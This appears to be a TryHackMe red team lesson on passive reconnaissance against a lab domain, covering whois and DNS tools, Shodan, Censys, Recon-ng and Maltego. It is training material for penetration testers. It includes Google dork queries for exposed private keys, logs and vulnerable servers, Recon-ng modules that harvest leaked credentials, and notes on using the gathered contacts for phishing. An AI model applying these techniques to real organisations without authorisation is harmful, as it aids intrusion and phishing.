![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/267a18249f3b9f9ad07e0b9e429bd942.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/267a18249f3b9f9ad07e0b9e429bd942.png)

*Lab Redirector Setup*

## **RECON**

**Introduction**

“Know your enemy, know 
his sword.” wrote Miyamoto Musashi in his book, A Book of Five Rings: 
The Classic Guide to Strategy. He also wrote, “You win battles by 
knowing the enemy’s timing, and using a timing which the enemy does not 
expect.” Although this was written when swords and spears won battles, 
it also applies to cyberspace, where attacks are launched via keyboards 
and crafted packets. The more you know about your target’s 
infrastructure and personnel, the better you can orchestrate your 
attacks.

In a red team operation, you might start with no more than a company 
name, from which you need to start gathering information about the 
target. This is where reconnaissance comes into play. Reconnaissance 
(recon) can be defined as a preliminary survey or observation of your 
target (client) without alerting them to your activities. If your recon 
activities create too much noise, the other party would be alerted, 
which might decrease the likelihood of your success.

The tasks of this room cover the following topics:

- Types of reconnaissance activities
- WHOIS and DNS-based reconnaissance
- Advanced searching
- Searching by image
- Google Hacking
- Specialized search engines
- Recon-ng
- Maltego

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/66c311960c9ad71cbda3709d1c9804e2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/66c311960c9ad71cbda3709d1c9804e2.png)

Some specific objectives we'll cover include:

- Discovering subdomains related to our target company
- Gathering publicly available information about a host and IP addresses
- Finding email addresses related to the target
- Discovering login credentials and leaked passwords
- Locating leaked documents and spreadsheets

Reconnaissance can be broken down into two parts — passive 
reconnaissance and active reconnaissance, as explained in Task 2. In 
this room, we will be focusing on passive reconnaissance, i.e., 
techniques that don’t alert the target or create 'noise'. In later 
rooms, we will use active reconnaissance tools that tend to be noisy by 
nature.

**Taxonomy of Reconnaissance**

Reconnaissance (recon) can be classified into two parts:

1. **Passive Recon**: can be carried out by watching passively
2. **Active Recon**: requires interacting with the target to provoke it in order to observe its response.

Passive recon doesn't require interacting with the target. In other 
words, you aren't sending any packets or requests to the target or the 
systems your target owns. Instead, passive recon relies on publicly 
available information that is collected and maintained by a third party.
 Open Source Intelligence (OSINT) is used to collect information about 
the target and can be as simple as viewing a target's publicly available
 social media profile. Example information that we might collect 
includes domain names, IP address blocks, email addresses, employee 
names, and job posts. In the upcoming task, we'll see how to query DNS 
records and expand on the topics from the [Passive Reconnaissance](https://tryhackme.com/room/passiverecon) room and introduce advanced tooling to aid in your recon.

Active recon requires interacting with the target by sending requests
 and packets and observing if and how it responds. The responses 
collected - or lack of responses - would enable us to expand on the 
picture we started developing using passive recon. An example of active 
reconnaissance is using Nmap to scan target subnets and live hosts. 
Other examples can be found in the [Active Reconnaissance](https://tryhackme.com/room/activerecon)
 room. Some information that we would want to discover include live 
hosts, running servers, listening services, and version numbers.

Active recon can be classified as:

1. **External Recon**: Conducted outside the target's
network and focuses on the externally facing assets assessable from the
Internet. One example is running Nikto from outside the company network.
2. **Internal Recon**: Conducted from within the target
company's network. In other words, the pentester or red teamer might be
physically located inside the company building. In this scenario, they
might be using an exploited host on the target's network. An example
would be using Nessus to scan the internal network using one of the
target’s computers.

**Built-in Tools**

This task focuses on:

- `whois`
- `dig`, `nslookup`, `host`
- `traceroute`/`tracert`

Before we start using the `whois` tool, let's look at WHOIS. WHOIS is a request and response protocol that follows the [RFC 3912](https://www.ietf.org/rfc/rfc3912.txt)
 specification. A WHOIS server listens on TCP port 43 for incoming 
requests. The domain registrar is responsible for maintaining the WHOIS 
records for the domain names it is leasing. `whois` will query the WHOIS server to provide all saved records. In the following example, we can see `whois` provides us with:

- Registrar WHOIS server
- Registrar URL
- Record creation date
- Record update date
- Registrant contact info and address (unless withheld for privacy)
- Admin contact info and address (unless withheld for privacy)
- Tech contact info and address (unless withheld for privacy)

Pentester Terminal

```
pentester@TryHackMe$ whois thmredteam.com[Querying whois.verisign-grs.com]
[Redirected to whois.namecheap.com]
[Querying whois.namecheap.com]
[whois.namecheap.com]
Domain name: thmredteam.com
Registry Domain ID: 2643258257_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.namecheap.com
Registrar URL: http://www.namecheap.com
Updated Date: 0001-01-01T00:00:00.00Z
Creation Date: 2021-09-24T14:04:16.00Z
Registrar Registration Expiration Date: 2022-09-24T14:04:16.00Z
Registrar: NAMECHEAP INC
Registrar IANA ID: 1068
Registrar Abuse Contact Email: abuse@namecheap.com
Registrar Abuse Contact Phone: +1.6613102107
Reseller: NAMECHEAP INC
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Registry Registrant ID:
Registrant Name: Withheld for Privacy Purposes
Registrant Organisation: Privacy service provided by Withheld for Privacy ehf
Registrant Street: Kalkofnsvegur 2
Registrant City: Reykjavik
Registrant State/Province: Capital Region
Registrant Postal Code: 101
Registrant Country: IS
Registrant Phone: +354.4212434
Registrant Phone Ext:
Registrant Fax:
Registrant Fax Ext:
Registrant Email: 4c9d5617f14e4088a4396b2f25430925.protect@withheldforprivacy.com
Registry Admin ID:
Admin Name: Withheld for Privacy Purposes
[...]
Tech Name: Withheld for Privacy Purposes
[...]
Name Server: kip.ns.cloudflare.comName Server: uma.ns.cloudflare.com
DNSSEC: unsigned
URL of the ICANN WHOIS Data Problem Reporting System: http://wdprs.internic.net/
>>> Last update of WHOIS database: 2021-10-13T10:42:40.11Z <<<
For more information on Whois status codes, please visit https://icann.org/epp
```

As we can see above, it is possible to gain a lot of valuable information with only a domain name. After a `whois`
 lookup, we might get lucky and find names, email addresses, postal 
addresses, and phone numbers, in addition to other technical 
information. At the end of the `whois` query, we find the authoritative name servers for the domain in question.

DNS queries can be executed with many different tools found on our 
systems, especially Unix-like systems. One common tool found on 
Unix-like systems, Windows, and macOS is `nslookup`. In the following query, we can see how `nslookup` uses the default DNS server to get the A and AAAA records related to our domain.

Pentester Terminal

```
pentester@TryHackMe$ nslookup cafe.thmredteam.comServer:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	cafe.thmredteam.com
Address: 104.21.93.169
Name:	cafe.thmredteam.com
Address: 172.67.212.249
Name:	cafe.thmredteam.com
Address: 2606:4700:3034::ac43:d4f9
Name:	cafe.thmredteam.com
Address: 2606:4700:3034::6815:5da9
```

Another tool commonly found on Unix-like systems is `dig`, short for Domain Information Groper (dig). `dig`
 provides a lot of query options and even allows you to specify a 
different DNS server to use. For example, we can use Cloudflare's DNS 
server: `dig @1.1.1.1 tryhackme.com`.

Pentester Terminal

```
pentester@TryHackMe$ dig cafe.thmredteam.com @1.1.1.1; <<>> DiG 9.16.21-RH <<>> cafe.thmredteam.com @1.1.1.1
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16698
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;cafe.thmredteam.com.		IN	A

;; ANSWER SECTION:
cafe.thmredteam.com.	3114	IN	A	104.21.93.169
cafe.thmredteam.com.	3114	IN	A	172.67.212.249

;; Query time: 4 msec
;; SERVER: 1.1.1.1#53(1.1.1.1)
;; WHEN: Thu Oct 14 10:44:11 EEST 2021
;; MSG SIZE  rcvd: 80
```

`host` is another useful alternative for querying DNS servers for DNS records. Consider the following example.

Pentester Terminal

```
pentester@TryHackMe$ host cafe.thmredteam.comcafe.thmredteam.com has address 172.67.212.249
cafe.thmredteam.com has address 104.21.93.169
cafe.thmredteam.com has IPv6 address 2606:4700:3034::ac43:d4f9
cafe.thmredteam.com has IPv6 address 2606:4700:3034::6815:5da9
```

The final tool that ships with Unix-like systems is `traceroute`, or on MS Windows systems, `tracert`.
 As the name indicates, it traces the route taken by the packets from 
our system to the target host. The console output below shows that `traceroute`
 provided us with the routers (hops) connecting us to the target system.
 It's worth stressing that some routers don’t respond to the packets 
sent by `traceroute`, and as a result, we don’t see their IP addresses; a `*` is used to indicate such a case.

Pentester Terminal

```
pentester@TryHackMe$ traceroute cafe.thmredteam.comtraceroute to cafe.thmredteam.com (172.67.212.249), 30 hops max, 60 byte packets
 1  _gateway (192.168.0.1)  3.535 ms  3.450 ms  3.398 ms
 2  * * *
 3  * * *
 4  * * *
 5  * * *
 6  * * *
 7  172.16.79.229 (172.16.79.229)  4.663 ms  6.417 ms  6.347 ms
 8  * * *
 9  172.16.49.1 (172.16.49.1)  6.688 ms 172.16.48.1 (172.16.48.1)  6.671 ms 172.16.49.1 (172.16.49.1)  6.651 ms
10  213.242.116.233 (213.242.116.233)  96.769 ms 81.52.187.243 (81.52.187.243)  96.634 ms  96.614 ms
11  bundle-ether302.pastr4.paris.opentransit.net (193.251.131.116)  96.592 ms  96.689 ms  96.671 ms
12  193.251.133.251 (193.251.133.251)  96.679 ms  96.660 ms  72.465 ms
13  193.251.150.10 (193.251.150.10)  72.392 ms 172.67.212.249 (172.67.212.249)  91.378 ms  91.306 ms
```

In summary, we can always rely on:

- `whois` to query the WHOIS database
- `nslookup`, `dig`, or `host` to query DNS servers

WHOIS databases and DNS servers hold publicly available information, 
and querying either does not generate any suspicious traffic.

Moreover, we can rely on Traceroute (`traceroute` on Linux and macOS systems and `tracert` on MS Windows systems) to discover the hops between our system and the target host.

**Advanced Searching**

Being
 able to use a search engine efficiently is a crucial skill. The 
following table shows some popular search modifiers that work with many 
popular search engines.

| Symbol / Syntax | Function |
| --- | --- |
| `"search phrase"` | Find results with exact search phrase |
| `OSINT filetype:pdf` | Find files of type `PDF` related to a certain term. |
| `salary site:blog.tryhackme.com` | Limit search results to a specific site. |
| `pentest -site:example.com` | Exclude a specific site from results |
| `walkthrough intitle:TryHackMe` | Find pages with a specific term in the page title. |
| `challenge inurl:tryhackme` | Find pages with a specific term in the page URL. |

Note: In addition to `pdf`, other filetypes to consider are: `doc`, `docx`, `ppt`, `pptx`, `xls` and `xlsx`.

Each search engine might have a slightly varied set of rules and 
syntax. To learn about the specific syntax for the different search 
engines, you will need to visit their respective help pages. Some search
 engines, such as Google, provide a web interface for advanced 
searches: [Google Advanced Search](https://www.google.com/advanced_search). Other times, it is best to learn the syntax by heart, such as [Google Refine Web Searches](https://support.google.com/websearch/answer/2466433), [DuckDuckGo Search Syntax](https://help.duckduckgo.com/duckduckgo-help-pages/results/syntax/), and [Bing Advanced Search Options](https://help.bing.microsoft.com/apex/index/18/en-US/10002).

Search engines crawl the world wide web day and night to index new 
web pages and files. Sometimes this can lead to indexing confidential 
information. Examples of confidential information include:

- Documents for internal company use
- Confidential spreadsheets with usernames, email addresses, and even passwords
- Files containing usernames
- Sensitive directories
- Service version number (some of which might be vulnerable and unpatched)
- Error messages

Combining advanced Google searches with specific terms, documents 
containing sensitive information or vulnerable web servers can be found.
 Websites such as [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
 (GHDB) collect such search terms and are publicly available. Let's take
 a look at some of the GHDB queries to see if our client has any 
confidential information exposed via search engines. GHDB contains 
queries under the following categories:

- **Footholds**Consider [GHDB-ID: 6364](https://www.exploit-db.com/ghdb/6364) as it uses the query `intitle:"index of" "nginx.log"` to discover Nginx logs and might reveal server misconfigurations that can be exploited.
- **Files Containing Usernames**For example, [GHDB-ID: 7047](https://www.exploit-db.com/ghdb/7047) uses the search term `intitle:"index of" "contacts.txt"` to discover files that leak juicy information.
- **Sensitive Directories**For example, consider [GHDB-ID: 6768](https://www.exploit-db.com/ghdb/6768), which uses the search term `inurl:/certs/server.key` to find out if a private RSA key is exposed.
- **Web Server Detection**Consider [GHDB-ID: 6876](https://www.exploit-db.com/ghdb/6876), which detects GlassFish Server information using the query `intitle:"GlassFish Server - Server Running"`.
- **Vulnerable Files**For example, we can try to locate PHP files using the query `intitle:"index of" "*.php"`, as provided by [GHDB-ID: 7786](https://www.exploit-db.com/ghdb/7786).
- **Vulnerable Servers**For instance, to discover SolarWinds Orion web consoles, [GHDB-ID: 6728](https://www.exploit-db.com/ghdb/6728) uses the query `intext:"user name" intext:"orion core" -solarwinds.com`.
- **Error Messages**Plenty of useful information can be extracted from error messages. One example is [GHDB-ID: 5963](https://www.exploit-db.com/ghdb/5963), which uses the query `intitle:"index of" errors.log` to find log files related to errors.

You might need to adapt these Google queries to fit your needs as the
 queries will return results from all web servers that fit the criteria 
and were indexed. To avoid legal issues, it is best to refrain from 
accessing any files outside the scope of your legal agreement.

We recommend you join the [Google Dorking](https://tryhackme.com/room/googledorking) room for more in-depth information.

Now we'll explore two additional sources that can provide valuable information without interacting with our target:

- Social Media
- Job ads

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f94dadbbcf2c644230d6eb310e159ed5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f94dadbbcf2c644230d6eb310e159ed5.png)

### Social Media

Social media websites have become very popular for not only personal 
use but also for corporate use. Some social media platforms can reveal 
tons of information about the target. This is especially true as many 
users tend to overshare details about themselves and their work. To name
 a few, it's worthwhile checking the following:

- LinkedIn
- Twitter
- Facebook
- Instagram

Social media websites make it easy to collect the names of a given 
company's employees; moreover, in certain instances, you might learn 
specific pieces of information that can reveal answers to password 
recovery questions or gain ideas to include in a targeted wordlist. 
Posts from technical staff might reveal details about a company’s 
systems and vendors. For example, a network engineer who was recently 
issued Juniper certifications may allude to Juniper networking 
infrastructure being used in their employer’s environment.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/cf84f21108b6aae75e1fa73018bf12db.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/cf84f21108b6aae75e1fa73018bf12db.png)

### Job Ads

Job advertisements can also tell you a lot about a company. In 
addition to revealing names and email addresses, job posts for technical
 positions could give insight into the target company’s systems and 
infrastructure. The popular job posts might vary from one country to 
another. Make sure to check job listing sites in the countries where 
your client would post their ads. Moreover, it is always worth checking 
their website for any job opening and seeing if this can leak any 
interesting information.

Note that the [Wayback Machine](https://archive.org/web/) can be helpful to retrieve previous versions of a job opening page on your client’s site.

**Specialized Search Engines**

### WHOIS and DNS Related

Beyond the standard WHOIS and DNS query tools that we covered in Task
 3, there are third parties that offer paid services for historical 
WHOIS data. One example is WHOIS history, which provides a history of 
WHOIS data and can come in handy if the domain registrant didn’t use 
WHOIS privacy when they registered the domain.

There are a handful of websites that offer advanced DNS services that
 are free to use. Some of these websites offer rich functionality and 
could have a complete room dedicated to exploring one domain. For now, 
we'll focus on key DNS related aspects. We will consider the following:

- [ViewDNS.info](https://viewdns.info/)
- [Threat Intelligence Platform](https://threatintelligenceplatform.com/)

### ViewDNS.info

[ViewDNS.info](https://viewdns.info/) offers *Reverse IP Lookup*.
 Initially, each web server would use one or more IP addresses; however,
 today, it is common to come across shared hosting servers. With shared 
hosting, one IP address is shared among many different web servers with 
different domain names. With reverse IP lookup, starting from a domain 
name or an IP address, you can find the other domain names using a 
specific IP address(es).

In the figure below, we used reverse IP lookup to find other servers sharing the same IP addresses used by `cafe.thmredteam.com`. Therefore, it is important to note that knowing the IP address does not necessarily lead to a single website.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a6a57e946b742bf9439430c1669382a5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a6a57e946b742bf9439430c1669382a5.png)

### Threat Intelligence Platform

[Threat Intelligence Platform](https://threatintelligenceplatform.com/)
 requires you to provide a domain name or an IP address, and it will 
launch a series of tests from malware checks to WHOIS and DNS queries. 
The WHOIS and DNS results are similar to the results we would get using `whois` and `dig`,
 but Threat Intelligence Platform presents them in a more readable and 
visually appealing way. There is extra information that we get with our 
report. For instance, after we look up `thmredteam.com`, we see that Name Server (NS) records were resolved to their respective IPv4 and IPv6 addresses, as shown in the figure below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8ba0fec5aad89cfb7c3d242ed92c9da4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8ba0fec5aad89cfb7c3d242ed92c9da4.png)

On the other hand, when we searched for `cafe.thmredteam.com`,
 we could also get a list of other domains on the same IP address. The 
result we see in the figure below is similar to the results we obtained 
using [ViewDNS.info](https://viewdns.info/).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c920bcf224185c47c4ba54b300079e48.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c920bcf224185c47c4ba54b300079e48.png)

### Specialized Search Engines

### Censys

[Censys Search](https://search.censys.io/) can provide a lot of information about IP addresses and domains. In this example, we look up one of the IP addresses that `cafe.thmredteam.com`
 resolves to. We can easily infer that the IP address we looked up 
belongs to Cloudflare. We can see information related to ports 80 and 
443, among others; however, it's clear that this IP address is used to 
server websites other than `cafe.thmredteam.com`. In other words, this IP address belongs to a company other than our client, [Organic Cafe](https://cafe.thmredteam.com/). It's critical to make this distinction so that we don’t probe systems outside the scope of our contract.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/efc8f98cc9e721707d4bad477340e120.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/efc8f98cc9e721707d4bad477340e120.png)

### Shodan

You might remember using [Shodan](https://www.shodan.io/) in the [Passive Reconnaissance](https://tryhackme.com/room/passiverecon) room. In this section, we will demonstrate how to use Shodan from the command line.

To use Shodan from the command-line properly, you need to create an account with [Shodan](https://www.shodan.io/), then configure `shodan` to use your API key using the command, `shodan init API_KEY`.

You can use different filters depending on the [type of your Shodan account](https://account.shodan.io/billing). To learn more about what you can do with `shodan`, we suggest that you check out [Shodan CLI](https://cli.shodan.io/). Let’s demonstrate a simple example of looking up information about one of the IP addresses we got from `nslookup cafe.thmredteam.com`. Using `shodan host IP_ADDRESS`, we can get the geographical location of the IP address and the open ports, as shown below.

Pentester Terminal

```
pentester@TryHackMe$ shodan host 172.67.212.249172.67.212.249
City:                    San Francisco
Country:                 United States
Organisation:            Cloudflare, Inc.
Updated:                 2021-11-22T05:55:54.787113
Number of open ports:    5

Ports:
     80/tcp
    443/tcp
	|-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2, TLSv1.3
   2086/tcp
   2087/tcp
   8080/tcp
```

**Recon-ng**

[Recon-ng](https://github.com/lanmaster53/recon-ng)
 is a framework that helps automate the OSINT work. It uses modules from
 various authors and provides a multitude of functionality. Some modules
 require keys to work; the key allows the module to query the related 
online API. In this task, we will demonstrate using Recon-ng in the 
terminal.

From a penetration testing and red team point of view, Recon-ng can 
be used to find various bits and pieces of information that can aid in 
an operation or OSINT task. All the data collected is automatically 
saved in the database related to your workspace. For instance, you might
 discover host addresses to later port-scan or collect contact email 
addresses for phishing attacks.

You can start Recon-ng by running the command `recon-ng`. Starting Recon-ng will give you a prompt like `[recon-ng][default] >`. At this stage, you need to select the installed module you want to use. However, if this is the first time you're running `recon-ng`, you will need to install the module(s) you need.

In this task, we will follow the following workflow:

1. Create a workspace for your project
2. Insert the starting information into the database
3. Search the marketplace for a module and learn about it before installing
4. List the installed modules and load one
5. Run the loaded module

### Creating a Workspace

Run `workspaces create WORKSPACE_NAME` to create a new workspace for your investigation. For example, `workspaces create thmredteam` will create a workspace named `thmredteam`.

`recon-ng -w WORKSPACE_NAME` starts recon-ng with the specific workspace.

### Seeding the Database

In reconnaissance, you are starting with one piece of information and
 transforming it into new pieces of information. For instance, you might
 start your research with a company name and use that to discover the 
domain name(s), contacts and profiles. Then you would use the new 
information you obtained to transform it further and learn more about 
your target.

Let’s consider the case where we know the target's domain name, `thmredteam.com`,
 and we would like to feed it into the Recon-ng database related to the 
active workspace. If we want to check the names of the tables in our 
database, we can run `db schema`.

We want to insert the domain name `thmredteam.com` into the domains table. We can do this using the command `db insert domains`.

Pentester Terminal

```
pentester@TryHackMe$ recon-ng -w thmredteam[...]
[recon-ng][thmredteam] > db insert domains
domain (TEXT): thmredteam.com
notes (TEXT):
[*] 1 rows affected.
[recon-ng][thmredteam] > marketplace search
```

### Recon-ng Marketplace

We have a domain name, so a logical next step would be to search for a
 module that transforms domains into other types of information. 
Assuming we are starting from a fresh installation of Recon-ng, we will 
search for suitable modules from the marketplace.

Before you install modules using the marketplace, these are some useful commands related to marketplace usage:

- `marketplace search KEYWORD` to search for available modules with *keyword*.
- `marketplace info MODULE` to provide information about the module in question.
- `marketplace install MODULE` to install the specified module into Recon-ng.
- `marketplace remove MODULE` to uninstall the specified module.

The modules are grouped under multiple categories, such as discovery,
 import, recon and reporting. Moreover, recon is also divided into many 
subcategories depending on the transform type. Run `marketplace search` to get a list of all available modules.

In the terminal below, we search for modules containing `domains-`.

Pentester Terminal

```
pentester@TryHackMe$ recon-ng -w thmredteam[...]
[recon-ng][thmredteam] > marketplace search domains-
[*] Searching module index for 'domains-'...

  +---------------------------------------------------------------------------------------------------+
  |                        Path                        | Version |     Status    |  Updated   | D | K |
  +---------------------------------------------------------------------------------------------------+
  | recon/domains-companies/censys_companies           | 2.0     | not installed | 2021-05-10 | * | * |
  | recon/domains-companies/pen                        | 1.1     | not installed | 2019-10-15 |   |   |
  | recon/domains-companies/whoxy_whois                | 1.1     | not installed | 2020-06-24 |   | * |
  | recon/domains-contacts/hunter_io                   | 1.3     | not installed | 2020-04-14 |   | * |
  | recon/domains-contacts/metacrawler                 | 1.1     | not installed | 2019-06-24 | * |   |
  | recon/domains-contacts/pen                         | 1.1     | not installed | 2019-10-15 |   |   |
  | recon/domains-contacts/pgp_search                  | 1.4     | not installed | 2019-10-16 |   |   |
  | recon/domains-contacts/whois_pocs                  | 1.0     | not installed | 2019-06-24 |   |   |
  | recon/domains-contacts/wikileaker                  | 1.0     | not installed | 2020-04-08 |   |   |
  | recon/domains-credentials/pwnedlist/account_creds  | 1.0     | not installed | 2019-06-24 | * | * |
  | recon/domains-credentials/pwnedlist/api_usage      | 1.0     | not installed | 2019-06-24 |   | * |
  | recon/domains-credentials/pwnedlist/domain_creds   | 1.0     | not installed | 2019-06-24 | * | * |
  | recon/domains-credentials/pwnedlist/domain_ispwned | 1.0     | not installed | 2019-06-24 |   | * |
  | recon/domains-credentials/pwnedlist/leak_lookup    | 1.0     | not installed | 2019-06-24 |   |   |
  | recon/domains-credentials/pwnedlist/leaks_dump     | 1.0     | not installed | 2019-06-24 |   | * |
  | recon/domains-domains/brute_suffix                 | 1.1     | not installed | 2020-05-17 |   |   |
  | recon/domains-hosts/binaryedge                     | 1.2     | not installed | 2020-06-18 |   | * |
  | recon/domains-hosts/bing_domain_api                | 1.0     | not installed | 2019-06-24 |   | * |
  | recon/domains-hosts/bing_domain_web                | 1.1     | not installed | 2019-07-04 |   |   |
  | recon/domains-hosts/brute_hosts                    | 1.0     | not installed | 2019-06-24 |   |   |
  | recon/domains-hosts/builtwith                      | 1.1     | not installed | 2021-08-24 |   | * |
  | recon/domains-hosts/censys_domain                  | 2.0     | not installed | 2021-05-10 | * | * |
  | recon/domains-hosts/certificate_transparency       | 1.2     | not installed | 2019-09-16 |   |   |
  | recon/domains-hosts/google_site_web                | 1.0     | not installed | 2019-06-24 |   |   |
  | recon/domains-hosts/hackertarget                   | 1.1     | not installed | 2020-05-17 |   |   |
  | recon/domains-hosts/mx_spf_ip                      | 1.0     | not installed | 2019-06-24 |   |   |
  | recon/domains-hosts/netcraft                       | 1.1     | not installed | 2020-02-05 |   |   |
  | recon/domains-hosts/shodan_hostname                | 1.1     | not installed | 2020-07-01 | * | * |
  | recon/domains-hosts/spyse_subdomains               | 1.1     | not installed | 2021-08-24 |   | * |
  | recon/domains-hosts/ssl_san                        | 1.0     | not installed | 2019-06-24 |   |   |
  | recon/domains-hosts/threatcrowd                    | 1.0     | not installed | 2019-06-24 |   |   |
  | recon/domains-hosts/threatminer                    | 1.0     | not installed | 2019-06-24 |   |   |
  | recon/domains-vulnerabilities/ghdb                 | 1.1     | not installed | 2019-06-26 |   |   |
  | recon/domains-vulnerabilities/xssed                | 1.1     | not installed | 2020-10-18 |   |   |
  +---------------------------------------------------------------------------------------------------+

  D = Has dependencies. See info for details.
  K = Requires keys. See info for details.

[recon-ng][thmredteam] >
```

We notice many subcategories under `recon`, such as `domains-companies`, `domains-contacts`, and `domains-hosts`. This naming tells us what kind of new information we will get from that transformation. For instance, `domains-hosts` means that the module will find hosts related to the provided domain.

Some modules, like `whoxy_whois`, require a key, as we can tell from the `*` under the `K` column. This requirement indicates that this module is not usable unless we have a key to use the related service.

Other modules have dependencies, indicated by a `*` under the `D` column. Dependencies show that third-party Python libraries might be necessary to use the related module.

Let’s say that you are interested in `recon/domains-hosts/google_site_web`. To learn more about any particular module, you can use the command `marketplace info MODULE`; this is an essential command that explains what the module does. For example, `marketplace info google_site_web`
 provides the following description: “Harvests hosts from Google.com by 
using the ‘site’ search operator. Updates the ‘hosts’ table with the 
results.” In other words, this module will use the Google search engine 
and the “site” operator.

We can install the module we want with the command `marketplace install MODULE`, for example, `marketplace install google_site_web`.

### Working with Installed Modules

We can work with modules using:

- `modules search` to get a list of all the installed modules
- `modules load MODULE` to load a specific module to memory

Let’s load the module that we installed earlier from the marketplace, `modules load viewdns_reverse_whois`. To `run` it, we need to set the required options.

- `options list` to list the options that we can set for the loaded module.
- `options set <option> <value>` to set the value of the option.

In a previous step, we have installed the module `google_site_web`, so let’s load it using `load google_site_web` and run it with `run`. We have already added the domain `thmredteam.com`
 to the database, so when the module is run, it will read that value 
from the database, get new kinds of information, and add them to the 
database in turn. The commands and the results are shown in the terminal
 output below.

Pentester Terminal

```
pentester@TryHackMe$ recon-ng -w thmredteam[...]
[recon-ng][thmredteam] > load google_site_web
[recon-ng][thmredteam][google_site_web] > run

--------------
THMREDTEAM.COM
--------------
[*] Searching Google for: site:thmredteam.com
[*] Country: None
[*] Host: cafe.thmredteam.com
[*] Ip_Address: None
[*] Latitude: None
[*] Longitude: None
[*] Notes: None
[*] Region: None
[*] --------------------------------------------------
[*] Country: None
[*] Host: clinic.thmredteam.com
[*] Ip_Address: None
[*] Latitude: None
[*] Longitude: None
[*] Notes: None
[*] Region: None
[*] --------------------------------------------------
[...]
[*] 2 total (2 new) hosts found.
[recon-ng][thmredteam][google_site_web] >
```

This module has queried Google and discovered two hosts, `cafe.thmredteam.com` and `clinic.thmredteam.com`. It is possible that by the time you run these steps, new hosts will also appear.

### Keys

Some modules cannot be used without a key for the respective service API. `K` indicates that you need to provide the relevant service key to use the module in question.

- `keys list` lists the keys
- `keys add KEY_NAME KEY_VALUE` adds a key
- `keys remove KEY_NAME` removes a key

Once you have the set of modules installed, you can proceed to load and run them.

- `modules load MODULE` loads an installed module
- `CTRL + C` unloads the module.
- `info` to review the loaded module’s info.
- `options list` lists available options for the chosen module.
- `options set NAME VALUE`
- `run` to execute the loaded module.

### Demo

To wrap up, use the following demonstration provided below containing all the steps we have explained earlier.

```

```

00:00

Use

```
recon-ng
```

to repeat the steps we carried out against

```
thmredteam.com
```

, then answer the following questions.

**Maltego**

[Maltego](https://www.maltego.com/)
 is an application that blends mind-mapping with OSINT. In general, you 
would start with a domain name, company name, person’s name, email 
address, etc. Then you can let this piece of information go through 
various transforms.

The information collected in Maltego can be used for later stages. 
For instance, company information, contact names, and email addresses 
collected can be used to create very legitimate-looking phishing emails.

Think of each block on a Maltego graph as an entity. An entity can have values to describe it. In Maltego’s terminology, a **transform**
 is a piece of code that would query an API to retrieve information 
related to a specific entity. The logic is shown in the figure below. *Information* related to an entity goes via a *transform* to return zero or more entities.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2e8ac9b5c947e1af26b7b9e24c5f8361.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2e8ac9b5c947e1af26b7b9e24c5f8361.png)

It is crucial to mention that some of the transforms available in 
Maltego might actively connect to the target system. Therefore, it is 
better to know how the transform works before using it if you want to 
limit yourself to passive reconnaissance.

Every transform might lead to several new values. For instance, if we start from the “DNS Name” `cafe.thmredteam.com`,
 we expect to get new kinds of entities based on the transform we use. 
For instance, “To IP Address” is expected to return IP addresses as 
shown next.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/948575bd71d1305e8505c854ac9b81e0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/948575bd71d1305e8505c854ac9b81e0.png)

One way to achieve this on Maltego is to right-click on the “DNS Name” `cafe.thmredteam.com` and choose:

1. Standard Transforms
2. Resolve to IP
3. To IP Address (DNS)

After executing this transform, we would get one or more IP addresses, as shown below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/956d258d9b72d88bb6e088c2f2b4690f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/956d258d9b72d88bb6e088c2f2b4690f.png)

Then we can choose to apply another transform for one of the IP addresses. Consider the following transform:

1. DNS from IP
2. To DNS Name from passive DNS (Robtex)

This transform will populate our graph with new DNS names. With a 
couple more clicks, you can get the location of the IP address, and so 
on. The result might be similar to the image below.

